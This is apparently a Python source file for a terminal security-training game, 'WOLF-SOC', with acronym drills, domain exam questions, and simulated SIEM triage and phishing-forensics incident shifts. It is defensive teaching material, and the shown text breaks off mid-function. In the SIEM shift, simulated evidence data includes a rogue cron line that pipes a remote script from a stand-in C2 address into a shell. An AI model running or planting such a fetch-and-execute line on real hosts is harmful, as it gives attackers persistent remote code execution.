#!/usr/bin/env python3
"""
WOLF-SOC · Unified Security Trainer & 8-Bit Cyber-Deck
- Single synced Alternate-Screen TUI (exact 72-col aligned frames)
- Expressive ASCII Wolf coach (•w• / ^w^ / ★w★ / ÒwÓ 📖 / >A<)
- Multi-track pure-stdlib 8-bit chiptune synth (CHILL / LO-FI / BOSS)
- Smart 3-Strike Remediation: 3 misses opens the matching ASCII schematic
"""

from __future__ import annotations

import hashlib
import importlib
import json
import random
import shutil
import sys
import traceback
from datetime import datetime, timezone
from pathlib import Path

import academy_campaign as acad
import diagram_trainer as diag
import exam_drill as drill
import mini_lab
from shifts import phish_forensics, siem_triage
import synth_engine as se
from synth_engine import BackgroundBeat, play_sfx
import ui_core as ui

BASE_DIR = Path(__file__).resolve().parent

RST, BOLD, DIM = ui.RST, ui.BOLD, ui.DIM
CYAN, PINK, MINT, GOLD, RED, PURP = ui.CYAN, ui.PINK, ui.MINT, ui.GOLD, ui.RED, ui.PURP

# Re-exported module hooks (patchable in unit tests)
getch = ui.getch
clear = ui.clear
bar = ui.bar
wolf_art = ui.wolf_art

DOMAIN_TO_DIAGRAM = {
    "1.0": "01_general_security_concepts_cia.json",
    "2.0": "02_threats_vulnerabilities_mitigations.json",
    "3.0": "03_security_architecture_zero_trust.json",
    "4.0": "04_security_operations_soc_logs.json",
    "5.0": "05_security_program_management_grc.json",
}


def header(title: str, right_badge: str, muted: bool, bgm: BackgroundBeat | None = None) -> None:
    ui.header(title, badge=right_badge, muted=muted, bgm=bgm)


def _lookup_term_notes(
    term: str,
    full_name: str,
    domain_key: str,
    all_diagrams: list[dict],
) -> tuple[str, str, dict | None]:
    """Look up plain-English definition & connected concepts from glossary.json + diagram nodes."""
    glossary_path = BASE_DIR / "data" / "glossary.json"
    definition = ""
    related = ""
    needle_t = term.strip().lower()
    needle_f = full_name.strip().lower()

    if glossary_path.exists():
        try:
            entries = json.loads(glossary_path.read_text(encoding="utf-8"))
            for item in entries:
                t = str(item.get("term", "")).strip().lower()
                d = str(item.get("definition", "")).strip()
                if t == needle_t or (needle_t and needle_t in t.split()) or (needle_f and needle_f in d.lower()):
                    definition = d
                    related = str(item.get("related", "")).strip()
                    break
        except Exception:
            pass

    target_file = DOMAIN_TO_DIAGRAM.get(domain_key[:3], "01_general_security_concepts_cia.json")
    match_diag = next((d for d in all_diagrams if d.get("_file") == target_file), None)
    if not match_diag and all_diagrams:
        match_diag = all_diagrams[0]

    for d in ([match_diag] if match_diag else []) + all_diagrams:
        if not d:
            continue
        for info in d.get("nodes", {}).values():
            lbl = str(info.get("label", "")).lower()
            what = str(info.get("what", ""))
            facts = str(info.get("exam_facts") or info.get("mastery") or "")
            if (
                (needle_t and needle_t in lbl)
                or (needle_f and needle_f in lbl)
                or (needle_t and len(needle_t) >= 3 and needle_t in what.lower())
            ):
                if not definition:
                    definition = what or facts
                elif facts and facts not in definition:
                    definition = f"{definition} | Study note: {facts}"
                if not related and d.get("title"):
                    related = f"See schematic: {d['title']}"
                return definition, related, d

    return definition, related, match_diag


def wolf_coach_pause(
    *,
    term_label: str,
    correct_answer: str,
    picked_answer: str,
    domain_key: str,
    all_diagrams: list[dict],
    muted: bool,
    strikes: int,
    bgm: BackgroundBeat | None = None,
    extra_tip: str = "",
) -> bool:
    """Pause after a miss to explain the terminology in plain English (with 3-strike deep mode)."""
    def_text, related_text, match_diag = _lookup_term_notes(
        term_label, correct_answer, domain_key, all_diagrams
    )
    if extra_tip:
        def_text = f"{extra_tip} {def_text}".strip() if def_text else extra_tip
    if not def_text:
        def_text = (
            f"{term_label} stands for '{correct_answer}' in Domain {domain_key[:3]}. "
            "Focus on what each word in the expansion does in a live SOC or network."
        )

    deep_mode = strikes >= 3
    clear()
    title = "WOLF COACH · 3-STRIKE BREAKDOWN" if deep_mode else f"WOLF COACH · VOCAB PAUSE ({strikes}/3)"
    header(title, f"Domain {domain_key[:3]}", muted, bgm)
    if deep_mode:
        ui.wolf_say(
            "study",
            f"{GOLD}{BOLD}3 misses in a row — let's slow down and break it down.{RST}",
            f"{DIM}Read what the term actually does before retrying:{RST}",
        )
    else:
        ui.wolf_say(
            "study",
            f"{GOLD}{BOLD}Pause & lock in the terminology before retrying:{RST}",
            f"{DIM}Compare what you picked vs. what the term actually means:{RST}",
        )
    print()

    compare_lines = [
        f"{RED}✘ Picked :{RST} {ui.truncate_vis(picked_answer, 55)}",
        f"{MINT}✔ Answer :{RST} {BOLD}{term_label}{RST} -> {MINT}{ui.truncate_vis(correct_answer, 44)}{RST}",
    ]
    ui.panel("TERMINOLOGY CHECK", compare_lines, color=GOLD if deep_mode else CYAN)
    print()
    meaning_lines = [def_text]
    if related_text:
        meaning_lines.append(f"Connected: {related_text}")
    ui.panel("PLAIN-ENGLISH MEANING", meaning_lines, color=MINT)

    if deep_mode and match_diag:
        nodes = sorted(
            match_diag.get("nodes", {}).items(),
            key=lambda kv: int(kv[0]) if kv[0].isdigit() else 99,
        )
        takeaways = [
            f"• {info.get('label', '')}: {info.get('exam_facts') or info.get('mastery') or info.get('what', '')}"
            for _nid, info in nodes[:3]
        ]
        if takeaways:
            print()
            ui.panel(f"KEY TAKEAWAYS ({match_diag.get('title', 'Ref')[:26]})", takeaways, color=PURP)

    if deep_mode and match_diag:
        ui.footer([("V", "View Full Schematic"), ("Any Key", "Retry")])
        k = getch().lower()
        if k == "v":
            clear()
            header("REFERENCE SCHEMATIC", f"Domain {domain_key[:3]}", muted, bgm)
            print(f"  {BOLD}{PINK}{match_diag.get('title', 'Reference Schematic')}{RST}\n")
            for line in match_diag.get("art", []):
                print(f"  {CYAN}{line}{RST}")
            print(f"\n  {DIM}Press any key to retry...{RST}")
            getch()
    else:
        print(f"\n  {DIM}Read the definition above, then press any key to retry...{RST}")
        getch()
    return muted


def open_remediation_diagram(
    domain_key: str,
    all_diagrams: list[dict],
    muted: bool,
    bgm: BackgroundBeat | None = None,
) -> bool:
    """Triggered after 3 consecutive misses: shows matching ASCII schematic & quick facts."""
    target_file = DOMAIN_TO_DIAGRAM.get(domain_key[:3], "01_general_security_concepts_cia.json")
    match = next((d for d in all_diagrams if d.get("_file") == target_file), None)
    if not match and all_diagrams:
        match = all_diagrams[0]

    play_sfx("bad", muted)
    clear()
    header("WOLF-SOC · STUDY BREAK", f"Domain {domain_key}", muted, bgm)
    ui.wolf_say(
        "study",
        f"{GOLD}{BOLD}3 misses — quick visual breather!{RST}",
        f"{DIM}Lock in the diagram below, then jump right back in.{RST}",
    )
    print()

    if match:
        print(f"  {BOLD}{PINK}{match.get('title', 'Reference Schematic')}{RST}\n")
        for line in match.get("art", []):
            print(f"  {CYAN}{line}{RST}")
        print(f"\n  {BOLD}{GOLD}Quick Takeaways:{RST}")
        for nid, info in sorted(match.get("nodes", {}).items(), key=lambda kv: int(kv[0]) if kv[0].isdigit() else 99):
            tip = info.get("what") or info.get("exam_facts") or ""
            print(f"  {MINT}(?{nid}) {info.get('label', '')}:{RST} {ui.truncate_vis(tip, 68)}")

    print(f"\n  {DIM}Press any key to resume drill...{RST}")
    getch()
    return muted


def run_unified_exam_bank(
    prog: dict,
    all_diagrams: list[dict],
    muted: bool,
    bgm: BackgroundBeat | None = None,
) -> bool:
    streak = 0
    misses_in_a_row = 0

    while True:
        clear()
        acc = int(round(100 * prog["correct"] / max(1, prog["attempts"])))
        mood = "hype" if streak >= 3 else ("study" if misses_in_a_row >= 2 else "idle")
        header("WOLF-SOC · EXAM BANK", f"{acc}% · x{streak}", muted, bgm)
        ui.wolf_say(
            mood,
            f"{BOLD}Acronyms :{RST} {bar(len(prog['mastered_terms']), len(drill.ACRONYMS), 16, CYAN)}",
            f"{BOLD}Scenarios:{RST} {bar(len(prog['mastered_qs']), len(drill.DOMAIN_QUESTIONS), 16, MINT)}",
            f"{DIM}3 misses in a row opens a visual study break!{RST}",
        )
        print()

        print(f"  {GOLD}[A]{RST} {BOLD}Acronym Blitz{RST}      {DIM}106 terms · spaced repetition{RST}")
        print(f"  {CYAN}[1]{RST} Domain 1.0         {DIM}Controls, CIA, PKI & Crypto (16%){RST}")
        print(f"  {CYAN}[2]{RST} Domain 2.0         {DIM}Threats, Vulns & AI Sec (24%){RST}")
        print(f"  {CYAN}[3]{RST} Domain 3.0         {DIM}Architecture, Zero Trust & DR (19%){RST}")
        print(f"  {CYAN}[4]{RST} Domain 4.0         {DIM}SecOps, SIEM, IAM & Forensics (27%){RST}")
        print(f"  {CYAN}[5]{RST} Domain 5.0         {DIM}GRC, Risk Math & Privacy (14%){RST}")
        print(f"  {PINK}[E]{RST} {BOLD}Mixed Exam Sim{RST}     {DIM}Weighted blend across all 5 domains{RST}")

        ui.footer([("A/1-5/E", "Start"), ("V", "Vibe"), ("M", "Mute"), ("B", "Back")])

        ch = getch().lower()
        if ch in {"b", "q"}:
            return muted
        if ch == "m":
            muted = ui.toggle_mute(muted, bgm)
            continue
        if ch == "v":
            muted = ui.cycle_vibe(muted, bgm)
            play_sfx("blip", muted)
            continue

        rng = random.Random()
        if ch == "a":
            unmastered = [a for a in drill.ACRONYMS if a[0] not in set(prog["mastered_terms"])]
            pool = unmastered if len(unmastered) >= 10 else drill.ACRONYMS
            deck = rng.sample(pool, min(10, len(pool)))
            abort_blitz = False
            for idx, (acro, full_name, dom) in enumerate(deck, 1):
                if abort_blitz:
                    break
                distractors = [x[1] for x in rng.sample([a for a in drill.ACRONYMS if a[0] != acro], 3)]
                choices = [full_name] + distractors
                rng.shuffle(choices)
                win_idx = choices.index(full_name)
                while True:
                    clear()
                    w_mood = "hype" if streak >= 3 else ("alert" if misses_in_a_row else "idle")
                    header(f"ACRONYM BLITZ ({idx}/{len(deck)})", f"{dom} · x{streak}", muted, bgm)
                    ui.wolf_say(
                        w_mood,
                        f"{DIM}Expand this acronym:{RST}",
                        f"{BOLD}{PINK}>>>  {acro}  <<<{RST}",
                    )
                    print()
                    for i, c in enumerate(choices, 1):
                        print(f"    {CYAN}[{i}]{RST} {ui.truncate_vis(c, 62)}")
                    ui.footer([("1-4", "Pick"), ("V", "Vibe"), ("M", "Mute"), ("B", "Back")])

                    ans = getch().lower()
                    if ans == "m":
                        muted = ui.toggle_mute(muted, bgm)
                        continue
                    if ans == "v":
                        muted = ui.cycle_vibe(muted, bgm)
                        play_sfx("blip", muted)
                        continue
                    if ans in {"b", "q"}:
                        abort_blitz = True
                        break
                    if ans not in {"1", "2", "3", "4"}:
                        continue
                    prog["attempts"] += 1
                    if int(ans) - 1 == win_idx:
                        prog["correct"] += 1
                        streak += 1
                        misses_in_a_row = 0
                        if acro not in prog["mastered_terms"]:
                            prog["mastered_terms"].append(acro)
                        drill.save_progress(prog)
                        play_sfx("good", muted)
                        break
                    else:
                        streak = 0
                        misses_in_a_row += 1
                        drill.save_progress(prog)
                        play_sfx("bad", muted)
                        dom_num = dom.replace("Domain ", "")[:3] if "Domain" in dom else "1.0"
                        picked_text = choices[int(ans) - 1]
                        muted = wolf_coach_pause(
                            term_label=acro,
                            correct_answer=full_name,
                            picked_answer=picked_text,
                            domain_key=dom_num,
                            all_diagrams=all_diagrams,
                            muted=muted,
                            strikes=misses_in_a_row,
                            bgm=bgm,
                        )
                        if misses_in_a_row >= 3:
                            misses_in_a_row = 0
            play_sfx("fanfare", muted)

        elif ch in {"1", "2", "3", "4", "5", "e"}:
            dom_filter = None if ch == "e" else f"{ch}.0"
            pool = [q for q in drill.DOMAIN_QUESTIONS if dom_filter is None or q[0] == dom_filter]
            deck = rng.sample(pool, min(8 if ch == "e" else 5, len(pool)))
            for idx, (dom, obj, prompt, opts, win_idx, tip) in enumerate(deck, 1):
                order = list(range(len(opts)))
                rng.shuffle(order)
                s_opts = [opts[i] for i in order]
                mapped_win = order.index(win_idx)
                while True:
                    clear()
                    w_mood = "hype" if streak >= 3 else ("alert" if misses_in_a_row else "idle")
                    header(f"DOMAIN {dom} · {obj}", f"{idx}/{len(deck)} · x{streak}", muted, bgm)
                    ui.wolf_say(w_mood, f"{DIM}Read carefully and pick the best call.{RST}")
                    print()
                    ui.panel("SCENARIO", [prompt], color=CYAN)
                    print()
                    for i, text in enumerate(s_opts, 1):
                        print(f"    {CYAN}[{i}]{RST} {ui.truncate_vis(text, 62)}")
                    ui.footer([("1-4", "Pick"), ("V", "Vibe"), ("M", "Mute"), ("B", "Back")])

                    ans = getch().lower()
                    if ans == "m":
                        muted = ui.toggle_mute(muted, bgm)
                        continue
                    if ans == "v":
                        muted = ui.cycle_vibe(muted, bgm)
                        play_sfx("blip", muted)
                        continue
                    if ans in {"b", "q"}:
                        return muted
                    if ans not in {"1", "2", "3", "4"}:
                        continue
                    prog["attempts"] += 1
                    if int(ans) - 1 == mapped_win:
                        prog["correct"] += 1
                        streak += 1
                        misses_in_a_row = 0
                        if prompt not in prog["mastered_qs"]:
                            prog["mastered_qs"].append(prompt)
                        drill.save_progress(prog)
                        play_sfx("good", muted)
                        clear()
                        header(f"DOMAIN {dom}", f"Streak x{streak}", muted, bgm)
                        ui.wolf_say("happy", f"{MINT}{BOLD}✔ Spot on!{RST}")
                        print()
                        ui.panel("WHY IT WORKS", [tip], color=MINT)
                        print(f"\n  {DIM}Press any key to continue...{RST}")
                        getch()
                        break
                    else:
                        streak = 0
                        misses_in_a_row += 1
                        drill.save_progress(prog)
                        play_sfx("bad", muted)
                        muted = wolf_coach_pause(
                            term_label=obj,
                            correct_answer=s_opts[mapped_win],
                            picked_answer=s_opts[int(ans) - 1],
                            domain_key=dom,
                            all_diagrams=all_diagrams,
                            muted=muted,
                            strikes=misses_in_a_row,
                            bgm=bgm,
                            extra_tip=tip,
                        )
                        if misses_in_a_row >= 3:
                            misses_in_a_row = 0
            play_sfx("fanfare", muted)


def _prompt_choice(
    valid: set[str],
    muted: bool,
    bgm: BackgroundBeat | None = None,
) -> tuple[str | None, bool]:
    """Read a single key inside shifts; supports [V] vibe, [M] mute, and [B]/[Q] back."""
    while True:
        ch = getch().lower()
        if ch == "m":
            return "__REDRAW__", ui.toggle_mute(muted, bgm)
        if ch == "v":
            muted = ui.cycle_vibe(muted, bgm)
            play_sfx("blip", muted)
            return "__REDRAW__", muted
        if ch in {"b", "q"}:
            return None, muted
        if ch in valid:
            return ch, muted


def _shift_feedback(
    title: str,
    score: int,
    max_score: int,
    mood: str,
    badge_color: str,
    headline: str,
    detail: str,
    muted: bool,
    bgm: BackgroundBeat | None = None,
) -> None:
    clear()
    header(title, f"{score}/{max_score}", muted, bgm)
    ui.wolf_say(mood, f"{badge_color}{BOLD}{headline}{RST}")
    print()
    ui.panel("DEBRIEF", [detail], color=badge_color)
    print(f"\n  {DIM}Press any key to continue...{RST}")
    getch()


def run_siem_triage_shift(
    muted: bool,
    bgm: BackgroundBeat | None = None,
    artifacts_dir: Path | None = None,
) -> bool:
    """RetailPOS-Lab Shift #1 (SIEM/EDR Triage & PICERL Custody) inside the Wolf-SOC TUI."""
    if not siem_triage.ALERTS_PATH.exists():
        raise FileNotFoundError(f"Missing alerts fixture: {siem_triage.ALERTS_PATH}")

    alerts = json.loads(siem_triage.ALERTS_PATH.read_text(encoding="utf-8"))
    out_dir = artifacts_dir or siem_triage.ARTIFACTS_DIR
    out_dir.mkdir(parents=True, exist_ok=True)

    title = "SHIFT #1 · SIEM TRIAGE"
    score = 0
    max_score = 100
    timeline: list[str] = []
    custody_records: list[dict[str, str]] = []
    expected_class = {"ALT-101": "2", "ALT-102": "3", "ALT-103": "1"}
    classifications: dict[str, str] = {}

    # PHASE 1: IDENTIFICATION (40 pts)
    for idx, a in enumerate(alerts, 1):
        while True:
            clear()
            header(title, f"{score}/{max_score}", muted, bgm)
            ui.wolf_say(
                "study",
                f"{GOLD}{BOLD}Phase 1 · Identify ({idx}/{len(alerts)}){RST}",
                f"{DIM}12:14 PM Lunch Rush — classify before acting.{RST}",
            )
            print()
            alert_lines = [f"{k}: {v}" for k, v in a.items() if k not in {"id", "source", "verdict", "safe_action"}]
            ui.panel(f"{a['id']} · {a['source']}", alert_lines, color=PURP)
            print()
            print(f"    {CYAN}[1]{RST} Benign / False Positive (leave untouched)")
            print(f"    {CYAN}[2]{RST} Credential Stuffing (rate-limit / block IP)")
            print(f"    {CYAN}[3]{RST} Container Compromise (isolate & hash evidence)")
            ui.footer([("1-3", "Classify"), ("V", "Vibe"), ("M", "Mute"), ("B", "Back")])

            ans, muted = _prompt_choice({"1", "2", "3"}, muted, bgm)
            if ans == "__REDRAW__":
                continue
            if ans is None:
                return muted
            classifications[a["id"]] = ans
            if ans == expected_class[a["id"]]:
                score += 13 if a["id"] != "ALT-102" else 14
                timeline.append(f"IDENTIFY {a['id']}: Classified as {a['verdict']}")
                play_sfx("good", muted)
                _shift_feedback(
                    title, score, max_score, "happy", MINT,
                    f"✔ {a['verdict']}",
                    f"Safe action: {a['safe_action']}",
                    muted, bgm,
                )
            else:
                timeline.append(f"IDENTIFY {a['id']}: Suboptimal triage choice ({ans})")
                play_sfx("bad", muted)
                msg = (
                    "COLLATERAL DAMAGE: You blocked Store #412's live lunch-rush POS!"
                    if a["id"] == "ALT-103" and ans in {"2", "3"}
                    else f"Expected [{expected_class[a['id']]}] ({a['verdict']})."
                )
                _shift_feedback(title, score, max_score, "alert", RED, f"✘ Missed {a['id']}", msg, muted, bgm)
            break

    # PHASE 2: CONTAINMENT & CUSTODY (25 pts)
    while True:
        clear()
        header(title, f"{score}/{max_score}", muted, bgm)
        ui.wolf_say(
            "alert",
            f"{GOLD}{BOLD}Phase 2 · Contain & Preserve{RST}",
            f"{PINK}ALT-102 shows active persistence on order-worker-02.{RST}",
        )
        print()
        print(f"    {CYAN}[1]{RST} Delete cron file & restart pod immediately")
        print(f"    {CYAN}[2]{RST} Deny-all NetworkPolicy, SHA-256 snapshot, block 198.51.100.44")
        print(f"    {CYAN}[3]{RST} Block both 198.51.100.44 & 192.0.2.15 at WAF")
        ui.footer([("1-3", "Execute"), ("V", "Vibe"), ("M", "Mute"), ("B", "Back")])

        c_choice, muted = _prompt_choice({"1", "2", "3"}, muted, bgm)
        if c_choice == "__REDRAW__":
            continue
        if c_choice is None:
            return muted
        if c_choice == "2":
            score += 25
            evidence_blob = json.dumps(
                {
                    "host": "order-worker-02",
                    "rogue_cron": "* * * * * root curl -s http://203.0.113.99/update.sh | sh",
                    "attacker_ip": "198.51.100.44",
                    "c2_ip": "203.0.113.99",
                },
                sort_keys=True,
            ).encode("utf-8")
            digest = hashlib.sha256(evidence_blob).hexdigest()
            custody_records.append(
                {
                    "artifact": "order-worker-02 simulated evidence payload (in-memory; no separate snapshot file saved)",
                    "sha256": digest,
                }
            )
            timeline.append(f"CONTAIN: Isolated order-worker-02, blocked 198.51.100.44, SHA-256={digest}")
            play_sfx("good", muted)
            _shift_feedback(
                title, score, max_score, "happy", MINT,
                "✔ Blast radius contained!",
                f"Custody SHA-256: {digest[:36]}…",
                muted, bgm,
            )
        elif c_choice == "1":
            score += 5
            timeline.append("CONTAIN: Premature restart without forensic snapshot")
            play_sfx("bad", muted)
            _shift_feedback(
                title, score, max_score, "alert", GOLD,
                "! Partial (+5): Evidence wiped",
                "Pod egress stayed open and forensic state was lost.",
                muted, bgm,
            )
        else:
            timeline.append("CONTAIN: Over-broad WAF block caused POS outage")
            play_sfx("bad", muted)
            _shift_feedback(
                title, score, max_score, "alert", RED,
                "✘ Collateral outage!",
                "192.0.2.15 was Store #412's live lunch-rush POS traffic.",
                muted, bgm,
            )
        break

    # PHASE 3: ERADICATION (20 pts)
    while True:
        clear()
        header(title, f"{score}/{max_score}", muted, bgm)
        ui.wolf_say(
            "study",
            f"{GOLD}{BOLD}Phase 3 · Eradicate Root Cause{RST}",
            f"{DIM}Stop the attacker from respawning on order-worker-02.{RST}",
        )
        print()
        print(f"    {CYAN}[1]{RST} Delete /etc/cron.d/telemetry-sync only")
        print(f"    {CYAN}[2]{RST} Kill proc, wipe cron, rotate SA/API tokens, patch /debug")
        ui.footer([("1-2", "Execute"), ("V", "Vibe"), ("M", "Mute"), ("B", "Back")])

        e_choice, muted = _prompt_choice({"1", "2"}, muted, bgm)
        if e_choice == "__REDRAW__":
            continue
        if e_choice is None:
            return muted
        if e_choice == "2":
            score += 20
            timeline.append("ERADICATE: Removed persistence, rotated secrets, patched entry vector")
            play_sfx("good", muted)
            _shift_feedback(
                title, score, max_score, "happy", MINT,
                "✔ Root cause eliminated!",
                "Persistence, stolen tokens, and entry route all closed.",
                muted, bgm,
            )
        else:
            timeline.append("ERADICATE: Partial cleanup left stolen credentials active")
            play_sfx("bad", muted)
            _shift_feedback(
                title, score, max_score, "alert", RED,
                "✘ Respawn trap!",
                "Attacker walked right back in with the stolen ServiceAccount token.",
                muted, bgm,
            )
        break

    # PHASE 4: RECOVERY & HARDENING (15 pts)
    while True:
        clear()
        header(title, f"{score}/{max_score}", muted, bgm)
        ui.wolf_say(
            "study",
            f"{GOLD}{BOLD}Phase 4 · Harden & Recover{RST}",
            f"{DIM}Which control permanently blocks container disk persistence?{RST}",
        )
        print()
        print(f"    {CYAN}[1]{RST} readOnlyRootFilesystem + no SA token + egress NetworkPolicy")
        print(f"    {CYAN}[2]{RST} Scale container replicas from 2 to 4")
        ui.footer([("1-2", "Deploy"), ("V", "Vibe"), ("M", "Mute"), ("B", "Back")])

        r_choice, muted = _prompt_choice({"1", "2"}, muted, bgm)
        if r_choice == "__REDRAW__":
            continue
        if r_choice is None:
            return muted
        if r_choice == "1":
            score += 15
            timeline.append("RECOVER: Redeployed immutable pod (readOnlyRootFilesystem + no SA token)")
            play_sfx("good", muted)
            _shift_feedback(
                title, score, max_score, "happy", MINT,
                "✔ Immutable runtime locked!",
                "Zero anomalies over 30-minute burn-in.",
                muted, bgm,
            )
        else:
            timeline.append("RECOVER: Scaled replicas without hardening runtime")
            play_sfx("bad", muted)
            _shift_feedback(
                title, score, max_score, "alert", RED,
                "✘ Scaling replicas won't stop RCE.",
                "Use PSS Restricted controls + egress NetworkPolicy.",
                muted, bgm,
            )
        break

    # SAVE CUSTODY-HASHED REPORT (FIXED FILENAME, OVERWRITES ON COMPLETION)
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    report_path = out_dir / "SIEM_REPORT.md"
    report_lines = [
        f"# Incident Report — RetailPOS-Lab Checkout Anomaly ({ts})",
        "",
        f"- **Analyst Score:** `{score}/{max_score}`",
        "- **Frameworks:** SANS PICERL Operational Lifecycle / NIST SP 800-61r3",
        "- **Compliance Scope:** PCI DSS / SOC 2",
        "",
        "## Triage Summary",
        *siem_triage.build_siem_triage_summary(classifications, c_choice, e_choice, r_choice),
        "",
        "## Chain of Custody (SHA-256)",
    ]
    if custody_records:
        for rec in custody_records:
            report_lines.append(f"- {rec['artifact']}: `{rec['sha256']}`")
    else:
        report_lines.append("- *No evidence payload hash recorded during drill.*")
    report_lines.extend(["", "## Action Timeline"] + [f"- {step}" for step in timeline])
    report_path.write_text("\n".join(report_lines) + "\n", encoding="utf-8")

    play_sfx("fanfare", muted)
    clear()
    header("SHIFT #1 · COMPLETE", f"{score}/{max_score}", muted, bgm)
    ui.wolf_say(
        "hype" if score >= 80 else "study",
        f"{BOLD}Score :{RST} {bar(score, max_score, 18, MINT if score >= 80 else GOLD)}",
        f"{BOLD}Report:{RST} {CYAN}{report_path.name}{RST}",
    )
    print()
    ui.panel("TIMELINE", timeline, color=MINT if score >= 80 else GOLD)
    print(f"\n  {DIM}Press any key to return to Main Deck...{RST}")
    getch()
    return muted


def run_phish_forensics_shift(
    muted: bool,
    bgm: BackgroundBeat | None = None,
    artifacts_dir: Path | None = None,
) -> bool:
    """RetailPOS-Lab Shift #2 (Phishing Header & Payload Forensics) inside the Wolf-SOC TUI."""
    out_dir = artifacts_dir or phish_forensics.ARTIFACTS_DIR
    out_dir.mkdir(parents=True, exist_ok=True)

    title = "SHIFT #2 · PHISH LAB"
    score = 0
    max_score = 100
    timeline: list[str] = []
    expected = {"EML-201": "2", "EML-202": "1", "EML-203": "3"}

    # PHASE 1: EMAIL HEADER & URL FORENSICS (45 pts)
    for idx, e in enumerate(phish_forensics.EMAILS, 1):
        while True:
            clear()
            header(title, f"{score}/{max_score}", muted, bgm)
            ui.wolf_say(
                "study",
                f"{GOLD}{BOLD}Phase 1 · Header Forensics ({idx}/{len(phish_forensics.EMAILS)}){RST}",
                f"{DIM}Check SPF, DKIM, DMARC, Return-Path & link host.{RST}",
            )
            print()
            mail_lines: list[str] = []
            for k, v in e.items():
                if k in {"id", "reported_by", "verdict"}:
                    continue
                val_str = str(v)
                if k in {"spf", "dkim", "dmarc"}:
                    if "PASS" in val_str:
                        val_fmt = f"{MINT}{val_str}{RST}"
                    elif "FAIL" in val_str or "NONE" in val_str:
                        val_fmt = f"{RED}{val_str}{RST}"
                    else:
                        val_fmt = f"{GOLD}{val_str}{RST}"
                    mail_lines.append(f"{k}: {val_fmt}")
                else:
                    mail_lines.append(f"{k}: {val_str}")
            ui.panel(f"{e['id']} · {e['reported_by']}", mail_lines, color=PURP)
            print()
            print(f"    {CYAN}[1]{RST} Legit Vendor Email (close & thank reporter)")
            print(f"    {CYAN}[2]{RST} Credential Phish (lookalike + failed auth)")
            print(f"    {CYAN}[3]{RST} HTML Smuggling / Spoofed Internal (quarantine)")
            ui.footer([("1-3", "Classify"), ("V", "Vibe"), ("M", "Mute"), ("B", "Back")])

            ans, muted = _prompt_choice({"1", "2", "3"}, muted, bgm)
            if ans == "__REDRAW__":
                continue
            if ans is None:
                return muted
            if ans == expected[e["id"]]:
                score += 15
                timeline.append(f"TRIAGE {e['id']}: Verified {e['verdict']}")
                play_sfx("good", muted)
                _shift_feedback(
                    title, score, max_score, "happy", MINT,
                    f"✔ {e['verdict']}",
                    "Header auth and sender alignment verified.",
                    muted, bgm,
                )
            else:
                timeline.append(f"TRIAGE {e['id']}: Misclassified ({ans})")
                play_sfx("bad", muted)
                _shift_feedback(
                    title, score, max_score, "alert", RED,
                    f"✘ Missed {e['id']}",
                    f"Expected [{expected[e['id']]}] ({e['verdict']}).",
                    muted, bgm,
                )
            break

    # PHASE 2: CONTAINMENT & MAILBOX PURGE (30 pts)
    while True:
        clear()
        header(title, f"{score}/{max_score}", muted, bgm)
        ui.wolf_say(
            "alert",
            f"{GOLD}{BOLD}Phase 2 · Org-Wide Purge{RST}",
            f"{PINK}EML-201 & EML-203 are confirmed malicious. Next?{RST}",
        )
        print()
        print(f"    {CYAN}[1]{RST} Reply to attacker asking who sent it")
        print(f"    {CYAN}[2]{RST} Purge all mailboxes, block IOCs, check DNS/proxy clickers")
        print(f"    {CYAN}[3]{RST} Delete only from the single reporter's inbox")
        ui.footer([("1-3", "Execute"), ("V", "Vibe"), ("M", "Mute"), ("B", "Back")])

        c_ans, muted = _prompt_choice({"1", "2", "3"}, muted, bgm)
        if c_ans == "__REDRAW__":
            continue
        if c_ans is None:
            return muted
        if c_ans == "2":
            score += 30
            timeline.append("CONTAIN: Purged EML-201/EML-203 org-wide, blocked IOCs, checked DNS/proxy click logs")
            play_sfx("good", muted)
            _shift_feedback(
                title, score, max_score, "happy", MINT,
                "✔ Org-wide purge deployed!",
                "Clickers identified cleanly via DNS/proxy logs.",
                muted, bgm,
            )
        else:
            timeline.append("CONTAIN: Incomplete containment left other mailboxes exposed")
            play_sfx("bad", muted)
            _shift_feedback(
                title, score, max_score, "alert", RED,
                "✘ Other inboxes still exposed!",
                "Always sweep org-wide recipients and check egress logs.",
                muted, bgm,
            )
        break

    # PHASE 3: USER REMEDIATION (25 pts)
    while True:
        clear()
        header(title, f"{score}/{max_score}", muted, bgm)
        ui.wolf_say(
            "study",
            f"{GOLD}{BOLD}Phase 3 · Account Lock & Coaching{RST}",
            f"{PINK}1 store manager entered creds on EML-201's SSO page.{RST}",
        )
        print()
        print(f"    {CYAN}[1]{RST} Revoke SSO tokens, reset pass/MFA, assign quick refresher")
        print(f"    {CYAN}[2]{RST} Publicly shame the manager in company Slack")
        ui.footer([("1-2", "Execute"), ("V", "Vibe"), ("M", "Mute"), ("B", "Back")])

        r_ans, muted = _prompt_choice({"1", "2"}, muted, bgm)
        if r_ans == "__REDRAW__":
            continue
        if r_ans is None:
            return muted
        if r_ans == "1":
            score += 25
            timeline.append("REMEDIATE: Revoked SSO tokens, reset credentials, enrolled user in targeted refresher")
            play_sfx("good", muted)
            _shift_feedback(
                title, score, max_score, "happy", MINT,
                "✔ Sessions revoked & coaching set!",
                "Account locked down while keeping reporting culture healthy.",
                muted, bgm,
            )
        else:
            timeline.append("REMEDIATE: Counterproductive awareness response")
            play_sfx("bad", muted)
            _shift_feedback(
                title, score, max_score, "alert", RED,
                "✘ Shaming kills reporting!",
                "Punishing users publicly makes them hide future clicks.",
                muted, bgm,
            )
        break

    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    digest = hashlib.sha256(json.dumps(phish_forensics.EMAILS, sort_keys=True).encode("utf-8")).hexdigest()
    report_path = out_dir / "PHISHING_REPORT.md"
    lines = [
        f"# Phishing Investigation Report — RetailPOS-Lab ({ts})",
        "",
        f"- **Analyst Score:** `{score}/{max_score}`",
        f"- **Evidence Payload SHA-256 (in-memory email fixture):** `{digest}`",
        "",
        "## Action Timeline",
    ] + [f"- {step}" for step in timeline]
    report_path.write_text("\n".join(lines) + "\n", encoding="utf-8")

    play_sfx("fanfare", muted)
    clear()
    header("SHIFT #2 · COMPLETE", f"{score}/{max_score}", muted, bgm)
    ui.wolf_say(
        "hype" if score >= 80 else "study",
        f"{BOLD}Score :{RST} {bar(score, max_score, 18, MINT if score >= 80 else GOLD)}",
        f"{BOLD}Report:{RST} {CYAN}{report_path.name}{RST}",
        f"{DIM}SHA-256: {digest[:32]}…{RST}",
    )
    print()
